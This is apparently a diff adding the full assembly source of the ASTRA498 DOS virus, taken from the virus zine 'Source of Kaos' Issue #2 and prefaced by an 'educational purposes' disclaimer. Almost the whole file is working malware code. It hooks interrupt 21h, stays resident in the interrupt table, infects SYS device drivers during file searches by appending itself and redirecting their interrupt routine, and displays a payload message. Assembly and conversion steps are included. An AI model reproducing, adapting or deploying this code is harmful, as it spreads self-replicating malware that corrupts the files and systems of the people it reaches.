@@ -1,0 +1,462 @@
+;
+;                          |- Source of Kaos -|
+;                          |-    Issue #2    -|
+;
+; Disclaimer:
+; This source code is provided educational purposes.  SOK takes no
+; responsiblity for how this source code is used.
+;
+;
+;
+;The astra virus 
+;does not work in dos 6.22
+;it goes mem resident in the interrupt table and since 6.22 
+;seems to use the tail end of the interupt table or
+;at least my copy of 6.22 does even on a clean floppy boot.
+; 
+; ASTRA498 device driver (sys file) infector
+; infects on int 21 4fh call (find next matching file)
+; after a number of infections will display 
+;"I like a flower's smell!"
+; when the int 21 09h call is used
+;
+;to assemble
+;tasm 
+;tlink
+; then use debug to convert the exe file to a sys file
+;debug astra.exe
+;nastra.sys
+;w 0
+;q
+;
+;then its ready 
+;----------------------------------------------------------------------------
+IP_INT21        EQU     0084H                   ;just used to reference
+CS_INT21        EQU     0086H                   ;int 21 vectors
+
+.radix  16
+.model tiny
+.code
+
+
+        org     0
+header:
+                dd      -1                      ; link to next driver    
+                                                          
+                dw      0C840H                  ;device attribute word     
+strategy        dw      offset STRAT            ;points to the strat routine
+int_rout        dw      offset ASTRA_START      ;usaul points to intr routine         
+                                                ;but virus changes this to 
+                                                ;itself
+dev_name        db      "SYSVIRUS"              ;just the device name
+REQ_HEADER      DD      ?                       ;a 4 word area that dos
+                                                ;uses with the driver to
+                                                ;exchange info
+;--------------------------------------------------------------------------                 
+;This is the strategy routine. Just takes whatever dos threw at it in es:bx  
+; and stores it at REQ_HEADER for use by the INTR procedure. This value is
+;the pointer to the request header, which the device uses to determine what is
+;being asked of it.
+; It is possible to infect this in fact this ASTRA498 probaly could
+;infect this routine just as easily as the intr
+STRAT:
+        mov     WORD PTR cs:[REQ_HEADER],bx
+        mov     WORD PTR cs:[REQ_HEADER+2],es
+        retf
+
+;--------------------------------------------------------------------------                 
+;This is the interrupt routine. It's called by DOS to tell the device driver
+;to do something. Typical calls include reading or writing to a device,
+;opening it, closing it, etc.
+;this is a demo intr routine just prints a message and exits 
+
+INTR:
+        push    bx si di ds es 
+        
+        push    cs
+        pop     ds
+        
+        les     di,[REQ_HEADER]         ;es:di points to request header
+        mov     al,es:[di+2]            ;get command number
+
+        or      al,al                   ;command number 0? (Initialize device)
+        jnz     INTR1                   ;nope, handle other commands
+        call    INIT                    ;yes, go initialize device
+        jmp     INTRX                   ;and exit INTR routine
+
+INTR1:  call    NOT_IMPLEMENTED         ;all other commands not implemented
+
+INTRX:  pop     es ds di si bx
+        retf
+
+;Device initialization routine, Function 0. 
+;This just displays MSG1 using int 10
+; can not depend on other int to be available since Dos has not 
+;fully loaded safer to use bios int other are simply shoot and miss
+
+INIT:
+        MOV     SI,OFFSET MSG1
+INITLP: LODSB
+        OR      AL,AL
+        JZ      INITX
+        mov     ah,0EH
+        int     10H
+        jmp     INITLP
+INITX:  mov     WORD PTR es:[di+ 14D],OFFSET END_DRIVER
+        mov     WORD PTR es:[di+ 16D],cs  ;indicate end of driver here
+        
+        xor     ax,ax           ;zero ax to indicate success and exit
+        retn
+
+MSG1            DB      'ASTRA 498 IS RELEASED',0DH,0AH,0
+
+;This routine is used for all non-implemented functions.
+NOT_IMPLEMENTED:
+        xor     ax,ax           ;zero ax to indicate success and exit
+        retn
+
+END_DRIVER:                     ;label to identify end of device driver
+
+        
+
+
+        ORG     670H
+;---------------------------------------------------------------------
+;ASTRA 498 virus sys infector
+;HERE IS WHERE THE VIRUS STARTS THE ORG 670 IS BECAUSE
+;THIS CODE IS A DISASSEMBLY OF AN INFECTED FILE WHERE THE VIRUS
+;STARTED AT (YOU GUESSED IT) 670H.
+; NOTE THAT THE VIRUS MUST START ON A EVEN PARAGRAPH OR IT WILL FAIL
+;SO IF YOU ALTER THE ORG STAY ON A EVEN PARAGRAPH BOUNDARY
+ 
+ASTRA_START:
+push    CS                      ;SAVE THE CS
+PUSH    AX                      ;SAVE THE AX
+
+CALL    DELTA                   ;THIS IS A USAUL VIRUS ACTIVITY
+                                ;OF FINDING THE OFFSET OF THE FILE
+DELTA:                          ;
+POP     AX                      ;            
+SUB     AX,OFFSET DELTA - OFFSET ASTRA_START         
+
+PUSH    CX                      ;SORTA NEAT CODE TAKE     
+MOV     CL,04                   ;THE OFFSET CHANGES IT TO      
+SHR     AX,CL                   ;A SEG ADDS TO THE CS NOW     
+MOV     CX,CS                   ;CS:770 EQUAL TO CS:0000     
+ADD     AX,CX                   ;only works because     
+POP     CX                      ;virus is set on paragraph boundary     
+                                ; which virus ensures before writing        
+                                ; ITSELF TO END OF CODE
+
+PUSH    AX                                              ;PUSH THE NEW SEGMENT
+MOV     AX,OFFSET NOW_0_OFFSET - offset ASTRA_START     ;GET NEW IP                            
+PUSH    AX                                              ;PUSH IT
+RETF                                                    ;GO THERE
+
+;---------------------------------------------------------------------------
+;AT THIS POINT VIRUS CAN ACT LIKE IT IS AT THAT ITS OFFSET WAS 0000
+
+NOW_0_OFFSET:
+POP     AX                                      ;RESTORES ORGINAL AX
+POP     CS:[ORGIN_CS - OFFSET ASTRA_START]      ;THIS SAVE THE ORGINAL CS 
+                                                ; SO WE CAN RETURN TO IT 
+                                                ;LATER
+
+PUSHF                                           ;SAVE EVERTHING
+PUSH    AX BX CX DX SI DI DS ES                 ;            
+
+MOV     AX,CS:[ORGIN_IP - OFFSET ASTRA_START]   ;GET THR ORGINAL IP FOR INTR
+MOV     DS,CS:[ORGIN_CS - OFFSET ASTRA_START]   ;GET DS = ORGINAL CS
+            
+MOV     DS:[int_rout],AX                        ;RESTORES THE HOST SO
+                                                ;IT WILL NO LONGER CALL THE 
+                                                ;VIRUS
+
+;NOW GET THE INTERUPT USUAL VIRII GRAB THE INT 21 VECTOR
+
+XOR     AX,AX                                    
+MOV     DS,AX                                    
+MOV     AX,DS:[IP_INT21]                         
+MOV     CS:[OLD_IP_INT21 - OFFSET ASTRA_START],AX        
+                                                         
+
+MOV     AX,DS:[CS_INT21]         
+MOV     CS:[OLD_CS_INT21 - OFFSET ASTRA_START],AX    
+                                         
+;NOW CHECK IF ALREADY IN MEMORY
+;without calling it directly
+; IF RETURN IS 05FF THEN ITS IN MEMORY OTHERWISE MUST GET IN MEMORY
+
+MOV     AX,0FF05H                           
+
+PUSHF                                       
+CALL    DWORD PTR CS:[OLD_IP_INT21 - OFFSET ASTRA_START]     
+
+CMP     AX,05FFH                           ;07BF 3DFF05   
+JZ      INT_21_IS_HOOKED       ;07E2       ;07C2 741E     
+
+;THIS IS WERE IT MOVES IT MEMORY RESIDENT
+;IN THE INTERUPT TABLE 200 TO 3F2
+;THERE IS A CONFLICT WITH DOS 6.22 AND MORE THAN LIKELY
+;5+ THEY SEEM TO USE THE LAST FEW INTERUPTS WHICH THIS OVERWRITES
+;SO WILL ONLY WORK AS IS IN DOS 3.3 MAYBE LOWER ONES AS WELL
+
+CLD                                             ;CLEAR THE DIRECTION FLAG
+XOR     SI,SI                                   ; DS:SI -> ES:DI
+MOV     ES,SI                                   ; HERE:0000 TO 0000:2000
+PUSH    CS                                      ;  
+POP     DS                                      ;   
+MOV     DI,0200                                 ;    
+MOV     CX,READ_BUFFER - OFFSET ASTRA_START     ;01F2h VIRUS LENGHT     
+REPZ    MOVSB                                   ;      
+CLI                                             ;        
+
+;0084 = IP_INT21
+;0086 = CS_INT21
+;NOW SET THE INT 21 TO POINT TO OUR ROUTINE IN MEMORY (INT TABLE)                                            
+
+MOV     WORD PTR ES:[IP_INT21],OFFSET VIRAL_INT_21 - OFFSET ASTRA_START 
+MOV     WORD PTR ES:[CS_INT21],0020H          
+
+;20:176 MEANS 0000:376      
+
+INT_21_IS_HOOKED:
+
+;WE ALL READY MODIFIED THE HOST TO NORMAL NOW LET IT RUN
+
+POP     ES DS DI SI DX CX BX AX            ;07E2 07            
+POPF                                       ;07EA 9D            
+
+;USE A FAR JMP TO GET TO HOST INTR ROUTINE
+;JMP     0A4B:00AD    
+                DB       0EAH    
+ORGIN_IP        DW      OFFSET INTR      
+ORGIN_CS        DW      0A4BH             
+
+        DB      "(C)"                   ;COPYRIGHT ;-))
+        db      " AsTrA"                ;
+        DB      ",JNP"                  ; WRITERS INITIALS ???
+  
+
+ORGINAL_FILE_LENGHT     DW      0670H   ;07FD 7006          
+
+ 
+INFECT_THE_FILE:
+MOV     AX,3D02H                         
+PUSHF                                     
+ 
+CALL    dword ptr cs:[OLD_IP_INT21 - OFFSET ASTRA_START]         
+ 
+JNB     file_opened                              
+RET             ;error return and exit      
+
+file_opened:
+MOV     BX,AX                           ;GET HANDLE IN RIGHT SPOT 
+
+MOV     CX,0002                         ; Read 2 bytes 
+MOV     AH,3F                           ; from file   
+PUSH    CS                              ; set ds to here
+POP     DS                              ; 
+MOV     DX,OFFSET READ_BUFFER - OFFSET ASTRA_START       
+                                                         
+PUSHF                                       
+CALL    dword ptr cs:[OLD_IP_INT21 - OFFSET ASTRA_START]  
+
+;seems to be checking if the file is a valid sys file
+;it is now possible to have sys file which are like exe files
+;so I believe this would stop attempts to infect those sys files
+
+CMP     WORD PTR cs:[READ_BUFFER - OFFSET ASTRA_START],-01  
+                                                        ; make sure its 
+JZ      Continue_the_process                            ; a sys we can handle     
+JMP     erorr_close_file                                ;if not get out    
+
+Continue_the_process:
+MOV     AX,4202                         ; GOTO END OF FILE      
+XOR     CX,CX                           ;          
+MOV     DX,CX                           ;          
+
+PUSHF                                     
+CALL    dword ptr cs:[OLD_IP_INT21 - OFFSET ASTRA_START]         
+
+MOV     cs:[ORGINAL_FILE_LENGHT - OFFSET ASTRA_START ],AX       ;save the file       
+XOR     CX,CX                                                   ;length
+MOV     DX,CS:[ORGINAL_FILE_LENGHT - OFFSET ASTRA_START]   
+SUB     DX,+02                              
+                                         
+                                         
+MOV     AX,4200                                         ;GOTO START +CX:DX      
+PUSHF                                                   ;                       
+CALL    DWORD PTR CS:[OLD_IP_INT21 - OFFSET ASTRA_START]        
+
+MOV     AH,3F                                           ; WRITE TO HOST     
+PUSH    CS                                              ; 1 BYTE TO FILE     
+POP     DS                                              ; FROM READ BUFFER       
+MOV     DX,OFFSET READ_BUFFER - OFFSET ASTRA_START                                  
+                                                        ;        
+MOV     CX,0001                                         ;        
+
+PUSHF                                                   
+CALL    DWORD PTR CS:[OLD_IP_INT21 - OFFSET ASTRA_START]       
+
+XOR     CX,CX                              ; GOTO OFFSET 8 OF FILE       
+MOV     DX,0008                            ; READ GET INTR       
+MOV     AX,4200                            ;        
+
+PUSHF                                      ;            
+CALL    DWORD PTR CS:[OLD_IP_INT21 - OFFSET ASTRA_START]       
+
+MOV     AH,3F                                           ;READ IN THE TWO    
+PUSH    CS                                              ; BYTES   
+POP     DS                                              ;INTR POINTER            
+MOV     DX,OFFSET ORGIN_IP - OFFSET ASTRA_START         ;
+MOV     CX,0002                                         ;
+
+PUSHF                                                  
+CALL    DWORD PTR CS:[OLD_IP_INT21 - OFFSET ASTRA_START]                      
+ 
+MOV     DX,CS:[ORGINAL_FILE_LENGHT - OFFSET ASTRA_START];USE THIS CODE TO  
+AND     DX,-10                                          ;GET THE EVEN 16D
+ADD     DX,+10                                          ;BOUNDARY
+MOV     CS:[ORGINAL_FILE_LENGHT - OFFSET ASTRA_START],DX;       
+                                                         
+
+XOR     CX,CX                                           ;GOT THERE     
+MOV     AX,4200                                         ;        
+
+PUSHF                                                               
+CALL    DWORD PTR CS:[OLD_IP_INT21 - OFFSET ASTRA_START]   
+                                                ;ds:dx = WRITE BUFFER
+MOV     CX,READ_BUFFER - OFFSET ASTRA_START     ;01F2 FILE LENGHT     
+XOR     DX,DX                                   ;WRITE TO END OF FILE        
+MOV     AH,40                                   ;          
+
+PUSHF                                                       
+CALL    DWORD PTR CS:[OLD_IP_INT21 - OFFSET ASTRA_START]   ;
+
+XOR     CX,CX                                           ;NOW GET TO OFFSET   
+MOV     DX,0008                                         ;8 to make the intr 
+MOV     AX,4200                                         ;pointer point to 
+                                                        ; the virus     
+
+PUSHF                                       
+CALL    DWORD PTR CS:[OLD_IP_INT21 - OFFSET ASTRA_START]      
+
+MOV     DX,OFFSET ORGINAL_FILE_LENGHT - OFFSET ASTRA_START          
+                                                        ;WRITE THE NEW     
+MOV     CX,0002                                         ; POINTER TO
+MOV     AH,40                                           ;  THE INTR  
+
+PUSHF                                                 
+CALL    DWORD PTR CS:[OLD_IP_INT21 - OFFSET ASTRA_START]     
+
+XOR     CX,CX                                           ;GET TO FILE END
+MOV     DX,CS:[ORGINAL_FILE_LENGHT - OFFSET ASTRA_START]     
+                                                 
+ADD     DX,READ_BUFFER - OFFSET ASTRA_START             ;01F2                  
+MOV     AX,4200                  
+
+PUSHF                                       
+CALL    DWORD PTR CS:[OLD_IP_INT21 - OFFSET ASTRA_START]    
+
+MOV     CX,0000                                         ;AND WRITE NOTHING       
+MOV     AH,40                               
+
+PUSHF                                       
+CALL    DWORD PTR CS:[OLD_IP_INT21 - OFFSET ASTRA_START]   
+
+erorr_close_file:
+MOV     AH,3E                                           ;CLOSE THE FILE      
+
+PUSHF                                       
+CALL    DWORD PTR CS:[OLD_IP_INT21 - OFFSET ASTRA_START]  
+RET                                       
+
+;---------------------------------------------------------------------
+VIRAL_INT_21:
+
+; THE "AM i"  INSTALLED CALL
+
+CMP     AX,0FF05H                          
+JNZ     NOT_INSTALL              
+MOV     AX,05FF                   
+IRET                               
+;---------------------------------------------------------------
+
+;IS IT WRITE TO STANDARD OUTPUT
+NOT_INSTALL:
+CMP     AH,09H                             
+JNZ     DO_NOT_DO_IT             
+TEST    BYTE PTR CS:[FLAG_1 - OFFSET ASTRA_START],08    
+                                         
+
+NOP                                         
+JZ      DO_NOT_DO_IT             
+
+PUSH    AX                        
+PUSH    DX                         
+PUSH    DS                          
+
+PUSH    CS                           
+POP     DS                            
+
+MOV     DX,OFFSET MESSAGE_1 - OFFSET ASTRA_START           
+                                       
+
+PUSHF                                   
+CALL    DWORD PTR CS:[OLD_IP_INT21 - OFFSET ASTRA_START]
+                                         
+
+POP     DS                                  
+POP     DX                                  
+POP     AX                                  
+
+;IS IT FIND NEXT MATCHING FILE
+DO_NOT_DO_IT:
+CMP     AH,4FH                            
+JNZ     NOPE_NO_SPREADING_THIS_TIME      
+
+ 
+
+PUSHF                                      
+PUSH    AX BX CX DX SI DI DS ES             
+
+MOV     AH,2FH                          ; GET DTA        
+                                        ; ES:BX = CURRENT DTA
+
+PUSHF                                    
+CALL    DWORD PTR CS:[OLD_IP_INT21 - OFFSET ASTRA_START]                       
+                                         
+
+PUSH    ES                               
+POP     DS                               
+MOV     DX,BX                                   ; DTA = ES:BX AND DS:DX       
+ADD     DX,+1E                                  ; SET DS:DX = THE FILE NAME      
+
+CALL    INFECT_THE_FILE          
+INC     BYTE PTR CS:[FLAG_1 - OFFSET ASTRA_START]   
+                                         
+
+POP     ES DS DI SI DX CX BX AX          
+POPF                                     
+
+WELL_WE_TRIED:
+NOPE_NO_SPREADING_THIS_TIME: 
+;JMP     0F83:09F1                         
+                DB      0EAH                
+OLD_IP_INT21    DW      09F1H               
+OLD_CS_INT21    DW      0F83H               
+;----------------------------------------------------------                
+
+MESSAGE_1       DB      0DH, 0AH,"I like a flower's smell!",0dh, 0ah  
+                db      24h                      
+FLAG_1          DB      0B3H                     
+ 
+                DB      "(5)"
+
+
+READ_BUFFER     EQU     $
+;READ_BUFFER      DB      3FH               ;0962 3F        
+
+
+                END     STRAT
